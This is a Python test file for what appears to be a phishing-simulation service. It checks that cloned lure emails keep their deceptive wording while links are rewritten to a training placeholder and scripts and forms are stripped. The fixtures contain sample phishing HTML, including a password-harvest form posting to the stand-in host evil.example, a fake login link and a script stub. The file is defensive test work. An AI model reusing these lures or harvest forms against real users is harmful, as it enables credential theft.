"""Clone-a-real-message neutralization: keep the copy, kill the payload.

The whole point of a cloned lure is that it reads like the real campaign — so
the deceptive wording the text SafetyValidator would reject (passwords,
verification codes, "sign in") must survive. Safety comes from neutralizing the
*mechanics*: every link becomes the training placeholder, and scripts/forms/
trackers are stripped. These tests pin exactly that split.
"""

from __future__ import annotations

import pytest
from kp_contracts.generation import TRAINING_URL_PLACEHOLDER
from kp_operator_api.clone_service import CloneError, clone_real_message


def test_preserves_deceptive_copy_and_neutralizes_the_link() -> None:
    html = (
        "<p>Your mailbox is locked. "
        '<a href="https://evil.example/login">Verify your password now</a></p>'
        "<script>steal()</script>"
    )
    result = clone_real_message(subject="Action required: verify your password", raw_html=html)

    # Deceptive copy kept — this is exactly what the text validator would reject.
    assert "verify your password" in result.plain_text.lower()
    assert "Verify your password now" in result.safe_html  # the anchor TEXT survives
    assert "verify your password" in result.subject.lower()

    # Payload neutralized: no real destination, no script.
    assert "evil.example" not in result.safe_html
    assert "<script" not in result.safe_html.lower()
    assert "steal" not in result.safe_html

    # Exactly the one safe link remains, in both bodies.
    assert TRAINING_URL_PLACEHOLDER in result.safe_html
    assert TRAINING_URL_PLACEHOLDER in result.plain_text
    assert result.provenance["rewritten_links"] == 1


def test_strips_credential_capture_form() -> None:
    html = (
        '<form action="https://evil.example/harvest" method="post">'
        '<label>Password <input type="password" name="pw"></label>'
        "<button>Sign in</button></form>"
    )
    result = clone_real_message(subject="Security alert", raw_html=html)
    assert "<form" not in result.safe_html.lower()
    assert "<input" not in result.safe_html.lower()
    assert "evil.example" not in result.safe_html
    # A safe training link is still guaranteed even though the source had none.
    assert TRAINING_URL_PLACEHOLDER in result.safe_html


def test_injects_training_link_when_source_has_none() -> None:
    result = clone_real_message(subject="Notice", raw_html="<p>Please review the attached invoice.</p>")
    assert TRAINING_URL_PLACEHOLDER in result.safe_html
    assert TRAINING_URL_PLACEHOLDER in result.plain_text
    assert "attached invoice" in result.plain_text.lower()  # copy preserved


def test_neutralizes_bare_urls_in_plain_text() -> None:
    result = clone_real_message(
        subject="Reset",
        raw_html="<p>Reset here.</p>",
        plain_text="Reset your account at https://evil.example/reset immediately.",
    )
    assert "evil.example" not in result.plain_text
    assert TRAINING_URL_PLACEHOLDER in result.plain_text
    assert "reset your account" in result.plain_text.lower()


def test_rejects_empty_input() -> None:
    with pytest.raises(CloneError):
        clone_real_message(subject="", raw_html="<p>x</p>")
    with pytest.raises(CloneError):
        clone_real_message(subject="Subject", raw_html="", plain_text="")
